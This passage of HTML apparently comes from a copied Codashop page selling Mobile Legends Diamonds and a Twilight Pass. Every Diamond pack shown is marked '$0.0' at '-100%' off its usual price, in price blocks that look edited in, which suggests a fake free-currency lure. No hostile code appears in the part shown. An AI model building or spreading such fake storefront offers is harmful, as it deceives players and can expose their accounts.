                                                                        <path d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm10-8a8 8 0 1 0 0 16 8 8 0 0 0 0-16Z"></path>
                                                                     </svg>
                                                                  </div>
                                                                  <!----><!---->
                                                               </div>
                                                               <!---->
                                                               <div class="sku-info-section__images" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__images__icon" data-v-b6e2aaf7=""><img data-nuxt-img="" srcset="images/1760334881866_c2467aa0-7575-406d-9f3e-86e0d3594895.png 1x, images/1760334881866_c2467aa0-7575-406d-9f3e-86e0d3594895.png 2x" onerror="this.setAttribute('data-error', 1)" alt="100 Diamonds (50+50) first recharge!" loading="lazy" src="images/1760334881866_c2467aa0-7575-406d-9f3e-86e0d3594895.png" data-v-b6e2aaf7=""></div>
                                                               </div>
                                                            </div>
                                                            <div class="price-section" data-testid="sku-item-starting-price-diamond_codashopUSD_1" data-v-b6e2aaf7="">
                                                               <!--[--><!---->
                                                               <div class="price-section__price" data-v-1a52783c="">
                                                                  <span class="price-section__price__prefix" data-v-1a52783c="">From</span>
                                                                  <div class="price-section__price__price-container" data-v-1a52783c="">
                                                                     <span class="price-section__price__price-container__amount" data-v-1a52783c="">$0.0</span><!---->
                                                                  </div>
                                                               </div>
                                                               <!----><!----><!--]-->
                                                            
                <div data-v-1a52783c="" class="price-section__usual-price">
                    <span data-v-1a52783c="" class="price-section__price__price-container__discount-tag"> -100% </span>
                    <span data-v-1a52783c="" class="price-section__usual-price__amount">$0.99</span>
                </div>
            </div>
                                                            <!---->
                                                         </div>
                                                         <!--[--><!----><!--]-->
                                                      </div>
                                                   </div>
                                                   <div id="headlessui-radiogroup-option-v-0-2-2" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state="" data-v-459ee809="">
                                                      <div id="sku-item-tile-diamond_codashopUSD_3" class="sku-card" data-testid="sku-item-tile-diamond_codashopUSD_3" capture-custom-sku-id="diamond_codashopUSD_3" capture-custom-sku-name="300 Diamonds (150+150) first recharge!" data-auto-capture="skuClick" data-v-459ee809="" data-v-b6e2aaf7="">
                                                         <div class="sku-card__inner-container" data-testid="sku-item-inner-container-diamond_codashopUSD_3" data-v-b6e2aaf7="">
                                                            <!----><!---->
                                                            <div class="sku-info-section" data-v-b6e2aaf7="">
                                                               <div class="sku-info-section__titles" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__titles__title" data-v-b6e2aaf7="">
                                                                     <span data-v-b6e2aaf7="">300 Diamonds (150+150) first recharge!</span>
                                                                     <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" class="sku-info-section__titles__icon" data-testid="sku-item-info-diamond_codashopUSD_3" data-v-b6e2aaf7="">
                                                                        <path d="M12 7a1 1 0 0 1 1 1v4a1 1 0 1 1-2 0V8a1 1 0 0 1 1-1Zm0 8a1 1 0 1 0 0 2h.01a1 1 0 1 0 0-2H12Z"></path>
                                                                        <path d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm10-8a8 8 0 1 0 0 16 8 8 0 0 0 0-16Z"></path>
                                                                     </svg>
                                                                  </div>
                                                                  <!----><!---->
                                                               </div>
                                                               <!---->
                                                               <div class="sku-info-section__images" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__images__icon" data-v-b6e2aaf7=""><img data-nuxt-img="" srcset="images/1760334212177_6cc8fbca-d807-442b-b78a-1e5d3acb76f7.png 1x, images/1760334212177_6cc8fbca-d807-442b-b78a-1e5d3acb76f7.png 2x" onerror="this.setAttribute('data-error', 1)" alt="300 Diamonds (150+150) first recharge!" loading="lazy" src="images/1760334212177_6cc8fbca-d807-442b-b78a-1e5d3acb76f7.png" data-v-b6e2aaf7=""></div>
                                                               </div>
                                                            </div>
                                                            <div class="price-section" data-testid="sku-item-starting-price-diamond_codashopUSD_3" data-v-b6e2aaf7="">
                                                               <!--[--><!---->
                                                               <div class="price-section__price" data-v-1a52783c="">
                                                                  <span class="price-section__price__prefix" data-v-1a52783c="">From</span>
                                                                  <div class="price-section__price__price-container" data-v-1a52783c="">
                                                                     <span class="price-section__price__price-container__amount" data-v-1a52783c="">$0.0</span><!---->
                                                                  </div>
                                                               </div>
                                                               <!----><!----><!--]-->
                                                            
                <div data-v-1a52783c="" class="price-section__usual-price">
                    <span data-v-1a52783c="" class="price-section__price__price-container__discount-tag"> -100% </span>
                    <span data-v-1a52783c="" class="price-section__usual-price__amount">$2.99</span>
                </div>
            </div>
                                                            <!---->
                                                         </div>
                                                         <!--[--><!----><!--]-->
                                                      </div>
                                                   </div>
                                                   <div id="headlessui-radiogroup-option-v-0-2-3" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state="" data-v-459ee809="">
                                                      <div id="sku-item-tile-diamond_codashopUSD_5" class="sku-card" data-testid="sku-item-tile-diamond_codashopUSD_5" capture-custom-sku-id="diamond_codashopUSD_5" capture-custom-sku-name="500 Diamonds (250+250) first recharge!" data-auto-capture="skuClick" data-v-459ee809="" data-v-b6e2aaf7="">
                                                         <div class="sku-card__inner-container" data-testid="sku-item-inner-container-diamond_codashopUSD_5" data-v-b6e2aaf7="">
                                                            <!----><!---->
                                                            <div class="sku-info-section" data-v-b6e2aaf7="">
                                                               <div class="sku-info-section__titles" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__titles__title" data-v-b6e2aaf7="">
                                                                     <span data-v-b6e2aaf7="">500 Diamonds (250+250) first recharge!</span>
                                                                     <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" class="sku-info-section__titles__icon" data-testid="sku-item-info-diamond_codashopUSD_5" data-v-b6e2aaf7="">
                                                                        <path d="M12 7a1 1 0 0 1 1 1v4a1 1 0 1 1-2 0V8a1 1 0 0 1 1-1Zm0 8a1 1 0 1 0 0 2h.01a1 1 0 1 0 0-2H12Z"></path>
                                                                        <path d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm10-8a8 8 0 1 0 0 16 8 8 0 0 0 0-16Z"></path>
                                                                     </svg>
                                                                  </div>
                                                                  <!----><!---->
                                                               </div>
                                                               <!---->
                                                               <div class="sku-info-section__images" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__images__icon" data-v-b6e2aaf7=""><img data-nuxt-img="" srcset="images/1760334881636_343d729a-bba3-4e75-90ec-16d27bd5f0a5.png 1x, images/1760334881636_343d729a-bba3-4e75-90ec-16d27bd5f0a5.png 2x" onerror="this.setAttribute('data-error', 1)" alt="500 Diamonds (250+250) first recharge!" loading="lazy" src="images/1760334881636_343d729a-bba3-4e75-90ec-16d27bd5f0a5.png" data-v-b6e2aaf7=""></div>
                                                               </div>
                                                            </div>
                                                            <div class="price-section" data-testid="sku-item-starting-price-diamond_codashopUSD_5" data-v-b6e2aaf7="">
                                                               <!--[--><!---->
                                                               <div class="price-section__price" data-v-1a52783c="">
                                                                  <span class="price-section__price__prefix" data-v-1a52783c="">From</span>
                                                                  <div class="price-section__price__price-container" data-v-1a52783c="">
                                                                     <span class="price-section__price__price-container__amount" data-v-1a52783c="">$0.0</span><!---->
                                                                  </div>
                                                               </div>
                                                               <!----><!----><!--]-->
                                                            
                <div data-v-1a52783c="" class="price-section__usual-price">
                    <span data-v-1a52783c="" class="price-section__price__price-container__discount-tag"> -100% </span>
                    <span data-v-1a52783c="" class="price-section__usual-price__amount">$4.99</span>
                </div>
            </div>
                                                            <!---->
                                                         </div>
                                                         <!--[--><!----><!--]-->
                                                      </div>
                                                   </div>
                                                   <div id="headlessui-radiogroup-option-v-0-2-4" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state="" data-v-459ee809="">
                                                      <div id="sku-item-tile-diamond_codashopUSD_10" class="sku-card" data-testid="sku-item-tile-diamond_codashopUSD_10" capture-custom-sku-id="diamond_codashopUSD_10" capture-custom-sku-name="1000 Diamonds (500+500) first recharge!" data-auto-capture="skuClick" data-v-459ee809="" data-v-b6e2aaf7="">
                                                         <div class="sku-card__inner-container" data-testid="sku-item-inner-container-diamond_codashopUSD_10" data-v-b6e2aaf7="">
                                                            <!----><!---->
                                                            <div class="sku-info-section" data-v-b6e2aaf7="">
                                                               <div class="sku-info-section__titles" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__titles__title" data-v-b6e2aaf7="">
                                                                     <span data-v-b6e2aaf7="">1000 Diamonds (500+500) first recharge!</span>
                                                                     <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" class="sku-info-section__titles__icon" data-testid="sku-item-info-diamond_codashopUSD_10" data-v-b6e2aaf7="">
                                                                        <path d="M12 7a1 1 0 0 1 1 1v4a1 1 0 1 1-2 0V8a1 1 0 0 1 1-1Zm0 8a1 1 0 1 0 0 2h.01a1 1 0 1 0 0-2H12Z"></path>
                                                                        <path d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm10-8a8 8 0 1 0 0 16 8 8 0 0 0 0-16Z"></path>
                                                                     </svg>
                                                                  </div>
                                                                  <!----><!---->
                                                               </div>
                                                               <!---->
                                                               <div class="sku-info-section__images" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__images__icon" data-v-b6e2aaf7=""><img data-nuxt-img="" srcset="images/1760334881406_4eaf074f-d49c-4571-8998-e5e56e64986e.png 1x, images/1760334881406_4eaf074f-d49c-4571-8998-e5e56e64986e.png 2x" onerror="this.setAttribute('data-error', 1)" alt="1000 Diamonds (500+500) first recharge!" loading="lazy" src="images/1760334881406_4eaf074f-d49c-4571-8998-e5e56e64986e.png" data-v-b6e2aaf7=""></div>
                                                               </div>
                                                            </div>
                                                            <div class="price-section" data-testid="sku-item-starting-price-diamond_codashopUSD_10" data-v-b6e2aaf7="">
                                                               <!--[--><!---->
                                                               <div class="price-section__price" data-v-1a52783c="">
                                                                  <span class="price-section__price__prefix" data-v-1a52783c="">From</span>
                                                                  <div class="price-section__price__price-container" data-v-1a52783c="">
                                                                     <span class="price-section__price__price-container__amount" data-v-1a52783c="">$0.0</span><!---->
                                                                  </div>
                                                               </div>
                                                               <!----><!----><!--]-->
                                                            
                <div data-v-1a52783c="" class="price-section__usual-price">
                    <span data-v-1a52783c="" class="price-section__price__price-container__discount-tag"> -100% </span>
                    <span data-v-1a52783c="" class="price-section__usual-price__amount">$9.99</span>
                </div>
            </div>
                                                            <!---->
                                                         </div>
                                                         <!--[--><!----><!--]-->
                                                      </div>
                                                   </div>
                                                   <!--]-->
                                                </div>
                                             </section>
                                             <section id="category-0" data-testid="category-section" class="mt-4" data-v-459ee809="" role="none">
                                                <h2 class="sku-list__category-name" data-testid="category-section-title" data-v-459ee809="" role="none">Diamonds</h2>
                                                <!----><!---->
                                                <div class="sku-list" data-v-459ee809="" role="none">
                                                   <!--[-->
                                                   <div id="headlessui-radiogroup-option-v-0-2-5" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state="" data-v-459ee809="">
                                                      <div id="sku-item-tile-diamond_codashopUSD_20" class="sku-card" data-testid="sku-item-tile-diamond_codashopUSD_20" capture-custom-sku-id="diamond_codashopUSD_20" capture-custom-sku-name="1160 Diamonds" data-auto-capture="skuClick" data-v-459ee809="" data-v-b6e2aaf7="">
                                                         <div class="sku-card--popular sku-card__inner-container" data-testid="sku-item-inner-container-diamond_codashopUSD_20" data-v-b6e2aaf7="">
                                                            <!----><!---->
                                                            <div class="sku-info-section" data-v-b6e2aaf7="">
                                                               <div class="sku-info-section__titles" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__titles__title" data-v-b6e2aaf7="">
                                                                     <span data-v-b6e2aaf7="">1160 Diamonds</span>
                                                                     <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" class="sku-info-section__titles__icon" data-testid="sku-item-info-diamond_codashopUSD_20" data-v-b6e2aaf7="">
                                                                        <path d="M12 7a1 1 0 0 1 1 1v4a1 1 0 1 1-2 0V8a1 1 0 0 1 1-1Zm0 8a1 1 0 1 0 0 2h.01a1 1 0 1 0 0-2H12Z"></path>
                                                                        <path d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm10-8a8 8 0 1 0 0 16 8 8 0 0 0 0-16Z"></path>
                                                                     </svg>
                                                                  </div>
                                                                  <!----><!---->
                                                               </div>
                                                               <!---->
                                                               <div class="sku-info-section__images" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__images__icon" data-v-b6e2aaf7=""><img data-nuxt-img="" srcset="images/1760334881128_be1975db-bc64-4c7e-a979-4862b4fdaeb1.png 1x, images/1760334881128_be1975db-bc64-4c7e-a979-4862b4fdaeb1.png 2x" onerror="this.setAttribute('data-error', 1)" alt="1160 Diamonds" loading="lazy" src="images/1760334881128_be1975db-bc64-4c7e-a979-4862b4fdaeb1.png" data-v-b6e2aaf7=""></div>
                                                               </div>
                                                            </div>
                                                            <div class="price-section" data-testid="sku-item-starting-price-diamond_codashopUSD_20" data-v-b6e2aaf7="">
                                                               <!--[--><!---->
                                                               <div class="price-section__price" data-v-1a52783c="">
                                                                  <span class="price-section__price__prefix" data-v-1a52783c="">From</span>
                                                                  <div class="price-section__price__price-container" data-v-1a52783c="">
                                                                     <span class="price-section__price__price-container__amount" data-v-1a52783c="">$0.0</span><!---->
                                                                  </div>
                                                               </div>
                                                               <!----><!----><!--]-->
                                                            
                <div data-v-1a52783c="" class="price-section__usual-price">
                    <span data-v-1a52783c="" class="price-section__price__price-container__discount-tag"> -100% </span>
                    <span data-v-1a52783c="" class="price-section__usual-price__amount">$19.99</span>
                </div>
            </div>
                                                            <!---->
                                                         </div>
                                                         <!--[-->
                                                         <div class="best-seller-tag" data-testid="best-seller-tag" data-v-b6e2aaf7="" data-v-dff4bb30="">
                                                            <span class="best-seller-tag__shimmer" data-v-dff4bb30=""></span>
                                                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="currentColor" class="best-seller-tag__icon" data-v-dff4bb30="">
                                                               <path d="M10 14.3917L15.15 17.5L13.7834 11.6417L18.3334 7.70002L12.3417 7.19169L10 1.66669L7.65835 7.19169L1.66669 7.70002L6.21669 11.6417L4.85002 17.5L10 14.3917Z" fill="currentColor"></path>
                                                            </svg>
                                                            <span class="best-seller-tag__text" data-v-dff4bb30="">BEST SELLER</span>
                                                         </div>
                                                         <!--]-->
                                                      </div>
                                                   </div>
                                                   <div id="headlessui-radiogroup-option-v-0-2-6" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state="" data-v-459ee809="">
                                                      <div id="sku-item-tile-diamond_codashopUSD_30" class="sku-card" data-testid="sku-item-tile-diamond_codashopUSD_30" capture-custom-sku-id="diamond_codashopUSD_30" capture-custom-sku-name="1770 Diamonds" data-auto-capture="skuClick" data-v-459ee809="" data-v-b6e2aaf7="">
                                                         <div class="sku-card__inner-container" data-testid="sku-item-inner-container-diamond_codashopUSD_30" data-v-b6e2aaf7="">
                                                            <!----><!---->
                                                            <div class="sku-info-section" data-v-b6e2aaf7="">
                                                               <div class="sku-info-section__titles" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__titles__title" data-v-b6e2aaf7="">
                                                                     <span data-v-b6e2aaf7="">1770 Diamonds</span>
                                                                     <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" class="sku-info-section__titles__icon" data-testid="sku-item-info-diamond_codashopUSD_30" data-v-b6e2aaf7="">
                                                                        <path d="M12 7a1 1 0 0 1 1 1v4a1 1 0 1 1-2 0V8a1 1 0 0 1 1-1Zm0 8a1 1 0 1 0 0 2h.01a1 1 0 1 0 0-2H12Z"></path>
                                                                        <path d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm10-8a8 8 0 1 0 0 16 8 8 0 0 0 0-16Z"></path>
                                                                     </svg>
                                                                  </div>
                                                                  <!----><!---->
                                                               </div>
                                                               <!---->
                                                               <div class="sku-info-section__images" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__images__icon" data-v-b6e2aaf7=""><img data-nuxt-img="" srcset="images/1760334880901_8ac54d18-429f-4e24-81e5-35d7184f43e5.png 1x, images/1760334880901_8ac54d18-429f-4e24-81e5-35d7184f43e5.png 2x" onerror="this.setAttribute('data-error', 1)" alt="1770 Diamonds" loading="lazy" src="images/1760334880901_8ac54d18-429f-4e24-81e5-35d7184f43e5.png" data-v-b6e2aaf7=""></div>
                                                               </div>
                                                            </div>
                                                            <div class="price-section" data-testid="sku-item-starting-price-diamond_codashopUSD_30" data-v-b6e2aaf7="">
                                                               <!--[--><!---->
                                                               <div class="price-section__price" data-v-1a52783c="">
                                                                  <span class="price-section__price__prefix" data-v-1a52783c="">From</span>
                                                                  <div class="price-section__price__price-container" data-v-1a52783c="">
                                                                     <span class="price-section__price__price-container__amount" data-v-1a52783c="">$0.0</span><!---->
                                                                  </div>
                                                               </div>
                                                               <!----><!----><!--]-->
                                                            
                <div data-v-1a52783c="" class="price-section__usual-price">
                    <span data-v-1a52783c="" class="price-section__price__price-container__discount-tag"> -100% </span>
                    <span data-v-1a52783c="" class="price-section__usual-price__amount">$29.99</span>
                </div>
            </div>
                                                            <!---->
                                                         </div>
                                                         <!--[--><!----><!--]-->
                                                      </div>
                                                   </div>
                                                   <div id="headlessui-radiogroup-option-v-0-2-7" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state="" data-v-459ee809="">
                                                      <div id="sku-item-tile-diamond_codashopUSD_50" class="sku-card" data-testid="sku-item-tile-diamond_codashopUSD_50" capture-custom-sku-id="diamond_codashopUSD_50" capture-custom-sku-name="2975 Diamonds" data-auto-capture="skuClick" data-v-459ee809="" data-v-b6e2aaf7="">
                                                         <div class="sku-card__inner-container" data-testid="sku-item-inner-container-diamond_codashopUSD_50" data-v-b6e2aaf7="">
                                                            <!----><!---->
                                                            <div class="sku-info-section" data-v-b6e2aaf7="">
                                                               <div class="sku-info-section__titles" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__titles__title" data-v-b6e2aaf7="">
                                                                     <span data-v-b6e2aaf7="">2975 Diamonds</span>
                                                                     <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" class="sku-info-section__titles__icon" data-testid="sku-item-info-diamond_codashopUSD_50" data-v-b6e2aaf7="">
                                                                        <path d="M12 7a1 1 0 0 1 1 1v4a1 1 0 1 1-2 0V8a1 1 0 0 1 1-1Zm0 8a1 1 0 1 0 0 2h.01a1 1 0 1 0 0-2H12Z"></path>
                                                                        <path d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm10-8a8 8 0 1 0 0 16 8 8 0 0 0 0-16Z"></path>
                                                                     </svg>
                                                                  </div>
                                                                  <!----><!---->
                                                               </div>
                                                               <!---->
                                                               <div class="sku-info-section__images" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__images__icon" data-v-b6e2aaf7=""><img data-nuxt-img="" srcset="images/1760334880670_2f8078c2-6df4-4a5a-a53e-a996cf36233d.png 1x, images/1760334880670_2f8078c2-6df4-4a5a-a53e-a996cf36233d.png 2x" onerror="this.setAttribute('data-error', 1)" alt="2975 Diamonds" loading="lazy" src="images/1760334880670_2f8078c2-6df4-4a5a-a53e-a996cf36233d.png" data-v-b6e2aaf7=""></div>
                                                               </div>
                                                            </div>
                                                            <div class="price-section" data-testid="sku-item-starting-price-diamond_codashopUSD_50" data-v-b6e2aaf7="">
                                                               <!--[--><!---->
                                                               <div class="price-section__price" data-v-1a52783c="">
                                                                  <span class="price-section__price__prefix" data-v-1a52783c="">From</span>
                                                                  <div class="price-section__price__price-container" data-v-1a52783c="">
                                                                     <span class="price-section__price__price-container__amount" data-v-1a52783c="">$0.0</span><!---->
                                                                  </div>
                                                               </div>
                                                               <!----><!----><!--]-->
                                                            
                <div data-v-1a52783c="" class="price-section__usual-price">
                    <span data-v-1a52783c="" class="price-section__price__price-container__discount-tag"> -100% </span>
                    <span data-v-1a52783c="" class="price-section__usual-price__amount">$49.99</span>
                </div>
            </div>
                                                            <!---->
                                                         </div>
                                                         <!--[--><!----><!--]-->
                                                      </div>
                                                   </div>
                                                   <div id="headlessui-radiogroup-option-v-0-2-8" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state="" data-v-459ee809="">
                                                      <div id="sku-item-tile-diamond_codashopUSD_70" class="sku-card" data-testid="sku-item-tile-diamond_codashopUSD_70" capture-custom-sku-id="diamond_codashopUSD_70" capture-custom-sku-name="4165 Diamonds" data-auto-capture="skuClick" data-v-459ee809="" data-v-b6e2aaf7="">
                                                         <div class="sku-card__inner-container" data-testid="sku-item-inner-container-diamond_codashopUSD_70" data-v-b6e2aaf7="">
                                                            <!----><!---->
                                                            <div class="sku-info-section" data-v-b6e2aaf7="">
                                                               <div class="sku-info-section__titles" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__titles__title" data-v-b6e2aaf7="">
                                                                     <span data-v-b6e2aaf7="">4165 Diamonds</span>
                                                                     <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" class="sku-info-section__titles__icon" data-testid="sku-item-info-diamond_codashopUSD_70" data-v-b6e2aaf7="">
                                                                        <path d="M12 7a1 1 0 0 1 1 1v4a1 1 0 1 1-2 0V8a1 1 0 0 1 1-1Zm0 8a1 1 0 1 0 0 2h.01a1 1 0 1 0 0-2H12Z"></path>
                                                                        <path d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm10-8a8 8 0 1 0 0 16 8 8 0 0 0 0-16Z"></path>
                                                                     </svg>
                                                                  </div>
                                                                  <!----><!---->
                                                               </div>
                                                               <!---->
                                                               <div class="sku-info-section__images" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__images__icon" data-v-b6e2aaf7=""><img data-nuxt-img="" srcset="images/1760334880443_5fe79b5f-2b25-435c-b64c-e72215186232.png 1x, images/1760334880443_5fe79b5f-2b25-435c-b64c-e72215186232.png 2x" onerror="this.setAttribute('data-error', 1)" alt="4165 Diamonds" loading="lazy" src="images/1760334880443_5fe79b5f-2b25-435c-b64c-e72215186232.png" data-v-b6e2aaf7=""></div>
                                                               </div>
                                                            </div>
                                                            <div class="price-section" data-testid="sku-item-starting-price-diamond_codashopUSD_70" data-v-b6e2aaf7="">
                                                               <!--[--><!---->
                                                               <div class="price-section__price" data-v-1a52783c="">
                                                                  <span class="price-section__price__prefix" data-v-1a52783c="">From</span>
                                                                  <div class="price-section__price__price-container" data-v-1a52783c="">
                                                                     <span class="price-section__price__price-container__amount" data-v-1a52783c="">$0.0</span><!---->
                                                                  </div>
                                                               </div>
                                                               <!----><!----><!--]-->
                                                            
                <div data-v-1a52783c="" class="price-section__usual-price">
                    <span data-v-1a52783c="" class="price-section__price__price-container__discount-tag"> -100% </span>
                    <span data-v-1a52783c="" class="price-section__usual-price__amount">$69.99</span>
                </div>
            </div>
                                                            <!---->
                                                         </div>
                                                         <!--[--><!----><!--]-->
                                                      </div>
                                                   </div>
                                                   <div id="headlessui-radiogroup-option-v-0-2-9" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state="" data-v-459ee809="">
                                                      <div id="sku-item-tile-diamond_codashopUSD_100" class="sku-card" data-testid="sku-item-tile-diamond_codashopUSD_100" capture-custom-sku-id="diamond_codashopUSD_100" capture-custom-sku-name="6000 Diamonds" data-auto-capture="skuClick" data-v-459ee809="" data-v-b6e2aaf7="">
                                                         <div class="sku-card--popular sku-card__inner-container" data-testid="sku-item-inner-container-diamond_codashopUSD_100" data-v-b6e2aaf7="">
                                                            <!----><!---->
                                                            <div class="sku-info-section" data-v-b6e2aaf7="">
                                                               <div class="sku-info-section__titles" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__titles__title" data-v-b6e2aaf7="">
                                                                     <span data-v-b6e2aaf7="">6000 Diamonds</span>
                                                                     <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" class="sku-info-section__titles__icon" data-testid="sku-item-info-diamond_codashopUSD_100" data-v-b6e2aaf7="">
                                                                        <path d="M12 7a1 1 0 0 1 1 1v4a1 1 0 1 1-2 0V8a1 1 0 0 1 1-1Zm0 8a1 1 0 1 0 0 2h.01a1 1 0 1 0 0-2H12Z"></path>
                                                                        <path d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm10-8a8 8 0 1 0 0 16 8 8 0 0 0 0-16Z"></path>
                                                                     </svg>
                                                                  </div>
                                                                  <!----><!---->
                                                               </div>
                                                               <!---->
                                                               <div class="sku-info-section__images" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__images__icon" data-v-b6e2aaf7=""><img data-nuxt-img="" srcset="images/1760334880213_372dd686-ae9c-4c7c-b041-cb2a2ff23eba.png 1x, images/1760334880213_372dd686-ae9c-4c7c-b041-cb2a2ff23eba.png 2x" onerror="this.setAttribute('data-error', 1)" alt="6000 Diamonds" loading="lazy" src="images/1760334880213_372dd686-ae9c-4c7c-b041-cb2a2ff23eba.png" data-v-b6e2aaf7=""></div>
                                                               </div>
                                                            </div>
                                                            <div class="price-section" data-testid="sku-item-starting-price-diamond_codashopUSD_100" data-v-b6e2aaf7="">
                                                               <!--[--><!---->
                                                               <div class="price-section__price" data-v-1a52783c="">
                                                                  <span class="price-section__price__prefix" data-v-1a52783c="">From</span>
                                                                  <div class="price-section__price__price-container" data-v-1a52783c="">
                                                                     <span class="price-section__price__price-container__amount" data-v-1a52783c="">$0.0</span><!---->
                                                                  </div>
                                                               </div>
                                                               <!----><!----><!--]-->
                                                            
                <div data-v-1a52783c="" class="price-section__usual-price">
                    <span data-v-1a52783c="" class="price-section__price__price-container__discount-tag"> -100% </span>
                    <span data-v-1a52783c="" class="price-section__usual-price__amount">$99.99</span>
                </div>
            </div>
                                                            <!---->
                                                         </div>
                                                         <!--[-->
                                                         <div class="best-seller-tag" data-testid="best-seller-tag" data-v-b6e2aaf7="" data-v-dff4bb30="">
                                                            <span class="best-seller-tag__shimmer" data-v-dff4bb30=""></span>
                                                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" fill="currentColor" class="best-seller-tag__icon" data-v-dff4bb30="">
                                                               <path d="M10 14.3917L15.15 17.5L13.7834 11.6417L18.3334 7.70002L12.3417 7.19169L10 1.66669L7.65835 7.19169L1.66669 7.70002L6.21669 11.6417L4.85002 17.5L10 14.3917Z" fill="currentColor"></path>
                                                            </svg>
                                                            <span class="best-seller-tag__text" data-v-dff4bb30="">BEST SELLER</span>
                                                         </div>
                                                         <!--]-->
                                                      </div>
                                                   </div>
                                                   <!--]-->
                                                </div>
                                             </section>
                                             <section id="category-2" data-testid="category-section" class="mt-4" data-v-459ee809="" role="none">
                                                <h2 class="sku-list__category-name" data-testid="category-section-title" data-v-459ee809="" role="none">Twilight Pass</h2>
                                                <!---->
                                                <div data-v-459ee809="" data-v-145a1ac1="" role="none">
                                                   <div class="category__banner" data-testid="category-banner" data-v-145a1ac1="" role="none">
                                                      <div class="category__banner-image" data-v-145a1ac1="" role="none"><img data-nuxt-img="" srcset="images/1741592304828_96c94238-d9db-43ff-b65d-d4c6d99eff4b.png 1x, images/1741592304828_96c94238-d9db-43ff-b65d-d4c6d99eff4b.png 2x" onerror="this.setAttribute('data-error', 1)" alt="Twilight Pass" loading="lazy" src="images/1741592304828_96c94238-d9db-43ff-b65d-d4c6d99eff4b.png" data-v-145a1ac1="" role="none"></div>
                                                      <div class="category__banner__content" data-v-145a1ac1="" role="none">
                                                         <div class="category__banner__content-title" data-testid="category-banner-title" data-v-145a1ac1="" role="none">Twilight Pass</div>
                                                         <div class="category__banner__content-description" data-v-145a1ac1="" role="none">Mobile Legends Twilight Pass <b role="none">can only be purchased once for each user account</b></div>
                                                         <div data-v-145a1ac1="" role="none">
                                                            <!---->
                                                         </div>
                                                      </div>
                                                   </div>
                                                   <!---->
                                                </div>
                                                <div class="sku-list" data-v-459ee809="" role="none">
                                                   <!--[-->
                                                   <div id="headlessui-radiogroup-option-v-0-2-10" role="radio" aria-checked="false" tabindex="-1" data-headlessui-state="" data-v-459ee809="">
                                                      <div id="sku-item-tile-growthplan_5_codashop_USD_10" class="sku-card" data-testid="sku-item-tile-growthplan_5_codashop_USD_10" capture-custom-sku-id="growthplan_5_codashop_USD_10" capture-custom-sku-name="Twilight Pass" data-auto-capture="skuClick" data-v-459ee809="" data-v-b6e2aaf7="">
                                                         <div class="sku-card__inner-container" data-testid="sku-item-inner-container-growthplan_5_codashop_USD_10" data-v-b6e2aaf7="">
                                                            <!----><!---->
                                                            <div class="sku-info-section" data-v-b6e2aaf7="">
                                                               <div class="sku-info-section__titles" data-v-b6e2aaf7="">
                                                                  <div class="sku-info-section__titles__title" data-v-b6e2aaf7="">
                                                                     <span data-v-b6e2aaf7="">Twilight Pass</span>
                                                                     <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" class="sku-info-section__titles__icon" data-testid="sku-item-info-growthplan_5_codashop_USD_10" data-v-b6e2aaf7="">
                                                                        <path d="M12 7a1 1 0 0 1 1 1v4a1 1 0 1 1-2 0V8a1 1 0 0 1 1-1Zm0 8a1 1 0 1 0 0 2h.01a1 1 0 1 0 0-2H12Z"></path>
                                                                        <path d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm10-8a8 8 0 1 0 0 16 8 8 0 0 0 0-16Z"></path>
                                                                     </svg>
                                                                  </div>
